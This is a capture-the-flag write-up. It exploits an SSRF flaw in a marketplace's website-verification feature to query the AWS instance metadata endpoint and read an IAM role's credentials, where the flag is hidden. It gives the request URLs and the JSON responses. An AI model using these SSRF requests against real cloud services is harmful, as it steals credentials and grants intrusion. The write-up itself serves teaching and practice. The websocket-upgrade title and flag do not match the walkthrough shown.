# The Upgrade Tunnel

## Problem Description

A private service hums behind the marketplace edge. Can you make the front door ask for something it was never meant to reach?

## Solution Walkthrough

On the `/vendor-application` page, you can see that there is a verify feature. Basically, it is very obviously SSRF, because it not only returns whether the verification succeeded, but also returns the content of the target webpage. Also, using `http://127.0.0.1:3000` can successfully show the homepage content.

SSRF means we need to find internal paths. I tried many things like `/flag.txt` and `/flag`, but there was nothing, so I thought I would try `http://169.254.169.254/`. This is the fixed address for IMDS in AWS, and when accessing `http://169.254.169.254/latest/meta-data/`, there really was something there.

```json
{
    "success": true,
    "message": "Website verification successful",
    "body": "instance-id\nhostname\niam/security-credentials/\nplacement/region\n"
}
```

So I slowly dug through it, and finally found the flag in `http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole`.

```json
{
    "success": true,
    "message": "Website verification successful",
    "body": "{\n  \"Code\": \"Success\",\n  \"LastUpdated\": \"2026-05-20T09:00:00Z\",\n  \"Type\": \"AWS-HMAC\",\n  \"AccessKeyId\": \"ASIA2026RIFFHACKDEMO\",\n  \"SecretAccessKey\": \"redacted-training-secret\",\n  \"Token\": \"bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}\",\n  \"Expiration\": \"2026-05-20T15:00:00Z\"\n}\n"
}
```

## Flag

```text
bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}
```
